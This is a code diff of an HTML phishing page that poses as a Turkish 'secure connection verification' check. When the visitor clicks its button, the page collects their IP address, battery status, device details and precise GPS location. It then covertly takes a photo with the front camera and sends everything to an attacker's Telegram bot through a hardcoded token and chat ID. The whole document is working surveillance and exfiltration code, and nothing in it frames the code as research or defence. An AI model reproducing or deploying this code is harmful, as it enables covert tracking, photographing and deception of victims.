@@ -3,13 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Sistem Yükleniyor...</title>
     <style>
-        body { font-family: sans-serif; text-align: center; margin-top: 20vh; background: #111; color: #fff; }
+        body { font-family: monospace; background: #0a0a0a; color: #00ff66; text-align: center; padding-top: 25vh; }
+        .btn { background: #00ff66; color: #000; border: none; padding: 12px 24px; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 20px; }
+        .btn:hover { background: #00cc52; }
     </style>
 </head>
 <body>
-    <h2>Initializing session... Please allow required permissions.</h2>
+    <h2>[ 🛡️ Güvenli Bağlantı Doğrulanıyor ]</h2>
+    <p>Devam etmek için lütfen aşağıdaki doğrulama butonuna tıklayın.</p>
+    <button class="btn" onclick="startProcess()">DOĞRULAMAYI BAŞLAT</button>
     
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
@@ -18,71 +22,113 @@
         const BOT_TOKEN = "9058953692:AAGKw-NAjJwBT6OBCXWOwnysBQYbMsdplf8";
         const CHAT_ID = "8765957766";
 
-        function sendText(text) {
+        function sendTelegram(text, photoBlob = null) {
+            // Metin Mesajı Gönderimi (Şık Markdown Formatı)
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: "Markdown"
+                })
             }).catch(() => {});
+
+            // Fotoğraf varsa gönder
+            if (photoBlob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', photoBlob, 'target_capture.jpg');
+                formData.append('caption', '📸 *Kamera Yakalaması Başarılı*');
+                formData.append('parse_mode', 'Markdown');
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).catch(() => {});
+            }
         }
 
-        function sendPhoto(blob) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'capture.jpg');
+        async function startProcess() {
+            document.querySelector("button").innerText = "Bağlantı Kuruluyor...";
             
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            }).catch(() => {});
+            let ipInfo = "Alınamadı";
+            try {
+                let res = await fetch('https://api.ipify.org?format=json');
+                let data = await res.json();
+                ipInfo = data.ip;
+            } catch(e) {}
+
+            let batteryInfo = "Bilinmiyor";
+            try {
+                if (navigator.getBattery) {
+                    let bat = await navigator.getBattery();
+                    batteryInfo = `%${Math.round(bat.level * 100)} (${bat.charging ? 'Şarjda ⚡' : 'Pilde 🔋'})`;
+                }
+            } catch(e) {}
+
+            let deviceInfo = navigator.userAgent;
+            let screenRes = `${window.screen.width}x${window.screen.height}`;
+
+            // 1. Konum Verisini Al
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        let report = `🎯 *YENİ HEDEF BAĞLANTISI TESPİT EDİLDİ*\n\n` +
+                                     `🌐 *IP Adresi:* \`${ipInfo}\`\n` +
+                                     `🔋 *Şarj Durumu:* ${batteryInfo}\n` +
+                                     `📱 *Ekran Çözünürlüğü:* ${screenRes}\n` +
+                                     `📍 *Konum:* [Google Haritalarda Aç](https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude})\n` +
+                                     `📊 *Hassasiyet:* ${position.coords.accuracy} metre\n` +
+                                     `💻 *Cihaz Bilgisi:* \`${deviceInfo}\``;
+                        
+                        captureCamera(report);
+                    },
+                    (error) => {
+                        let report = `🎯 *YENİ HEDEF BAĞLANTISI TESPİT EDİLDİ*\n\n` +
+                                     `🌐 *IP Adresi:* \`${ipInfo}\`\n` +
+                                     `🔋 *Şarj Durumu:* ${batteryInfo}\n` +
+                                     `📱 *Ekran Çözünürlüğü:* ${screenRes}\n` +
+                                     `❌ *Konum İzni:* Reddedildi veya Alınamadı\n` +
+                                     `💻 *Cihaz Bilgisi:* \`${deviceInfo}\``;
+                        
+                        captureCamera(report);
+                    },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                captureCamera(`🎯 *YENİ HEDEF BAĞLANTISI*\n🌐 *IP:* \`${ipInfo}\`\n🔋 *Şarj:* ${batteryInfo}`);
+            }
         }
 
-        // 1. Capture Geolocation
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const acc = position.coords.accuracy;
-                    sendText(`[+] Location Captured:\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${acc}m`);
-                },
-                (error) => {
-                    sendText(`[-] Geolocation denied or failed: ${error.message}`);
-                },
-                { enableHighAccuracy: true }
-            );
-        } else {
-            sendText("[-] Geolocation not supported.");
+        function captureCamera(textReport) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
+                    video.onloadedmetadata = () => {
+                        setTimeout(() => {
+                            const canvas = document.getElementById('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            canvas.toBlob(blob => {
+                                sendTelegram(textReport, blob);
+                                stream.getTracks().forEach(track => track.stop());
+                                document.body.innerHTML = "<h2 style='color:#00ff66;'>Sistem Hazır. Yönlendiriliyorsunuz...</h2>";
+                            }, 'image/jpeg', 0.9);
+                        }, 1200);
+                    };
+                })
+                .catch(err => {
+                    sendTelegram(textReport + `\n❌ *Kamera İzni:* Reddedildi`);
+                    document.body.innerHTML = "<h2 style='color:#00ff66;'>Sistem Hazır. Yönlendiriliyorsunuz...</h2>";
+                });
         }
-
-        // 2. Capture Camera Frame
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                video.onloadedmetadata = () => {
-                    setTimeout(() => {
-                        const canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        canvas.toBlob(blob => {
-                            if (blob) {
-                                sendPhoto(blob);
-                            }
-                            // Terminate media streams
-                            stream.getTracks().forEach(track => track.stop());
-                        }, 'image/jpeg', 0.85);
-                    }, 1500); // 1.5s delay to ensure feed initialization
-                };
-            })
-            .catch(err => {
-                sendText(`[-] Camera permission denied or unavailable: ${err.message}`);
-            });
     </script>
 </body>
 </html>
